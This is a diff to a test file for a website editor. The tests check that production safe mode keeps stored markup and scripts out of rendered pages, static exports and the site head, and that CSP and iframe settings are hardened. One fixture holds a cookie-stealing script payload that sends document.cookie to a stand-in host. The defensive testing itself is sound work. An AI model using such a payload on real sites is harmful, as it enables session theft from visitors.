@@ -36,7 +36,15 @@ test("production holds stored markup out of the same-origin render", () => {
 
 test("development still renders stored markup so the feature can be built", () => {
   assert.equal(mayRenderStoredMarkup({ NODE_ENV: "development" } as NodeJS.ProcessEnv), true);
+  assert.equal(mayRenderStoredMarkup({ NODE_ENV: "test" } as NodeJS.ProcessEnv), true);
   assert.equal(storedMarkupOrNull("<b>hi</b>", { NODE_ENV: "development" } as NodeJS.ProcessEnv), "<b>hi</b>");
+});
+
+test("unknown or standalone runtime environments fail closed", () => {
+  assert.equal(storedCodeMode({}), "safe");
+  assert.equal(storedCodeMode({ NODE_ENV: "staging" }), "safe");
+  assert.equal(mayRenderStoredMarkup({ STORED_CODE_UNSAFE_RENDER: "allow" }), false);
+  assert.equal(storedMarkupOrNull("<b>held</b>", {}), null);
 });
 
 test("the production break-glass is explicit, non-default and loud to set", () => {
@@ -57,6 +65,8 @@ test("the preview page and both active-content blocks route through safe mode", 
 
   const textBlock = read("src/built-ins/modules/website-editor/src/components/blocks/TextBlock.tsx");
   assert.match(textBlock, /mayRenderStoredMarkup\(\)/, "TextBlock must gate raw-HTML rendering on safe mode");
+  assert.match(textBlock, /if \(!editorMode \|\| !rawMarkupAllowed\) return;/, "TextBlock effect must not assign innerHTML in safe mode");
+  assert.match(textBlock, /if \(!rawMarkupAllowed\)[\s\S]*?textContent \?\? ""/, "TextBlock editor must render and commit inert text in safe mode");
 });
 
 test("the editor iframe no longer combines allow-scripts with allow-same-origin", () => {
@@ -76,4 +86,33 @@ test("the production CSP drops the broad https: script source and narrows frame-
   assert.doesNotMatch(prodScript, /https:/, `production script-src still allows a broad https: source: "${prodScript}"`);
   assert.match(prodScript, /'self'/, "script-src must keep 'self'");
   assert.match(config, /frame-ancestors 'self'\$\{DEV_LOOPBACK_FRAME_SOURCES\}`/, "frame-ancestors must be 'self' only (plus dev loopback)");
+});
+
+// ─── Item 8: behavioural — stored code does not reach a rendered/exported sink ──
+
+test("production safe mode strips a stored <script> from the STATIC EXPORT (behavioural)", async () => {
+  const { renderBlockToHtml } = await import("../src/built-ins/modules/website-editor/src/server/staticExport");
+  const evilBlock = { id: "b1", type: "html", props: { html: "<script>fetch('//evil.example?c='+document.cookie)</script>" } } as never;
+  const prior = process.env.NODE_ENV;
+  process.env.NODE_ENV = "production";
+  try {
+    const out = renderBlockToHtml(evilBlock);
+    assert.doesNotMatch(out, /<script>/i, "a stored <script> must not survive into a production export");
+    assert.match(out, /held for security review/i, "the export must emit a placeholder instead");
+  } finally {
+    if (prior === undefined) delete process.env.NODE_ENV; else process.env.NODE_ENV = prior;
+  }
+  // Non-production keeps the raw HTML so the feature can be built/tested.
+  const priorDev = process.env.NODE_ENV;
+  process.env.NODE_ENV = "development";
+  try {
+    assert.match(renderBlockToHtml(evilBlock), /<script>/i, "non-production renders the raw markup");
+  } finally {
+    if (priorDev === undefined) delete process.env.NODE_ENV; else process.env.NODE_ENV = priorDev;
+  }
+});
+
+test("SiteHead gates the stored head-injection script on production safe mode (source contract)", () => {
+  const src = readFileSync(join(ROOT, "src/built-ins/modules/website-editor/src/components/storefront/SiteHead.tsx"), "utf8");
+  assert.match(src, /mayRenderStoredMarkup\(\)\s*&&\s*publishedPage\.headInjection/, "headInjection must be gated by safe mode");
 });
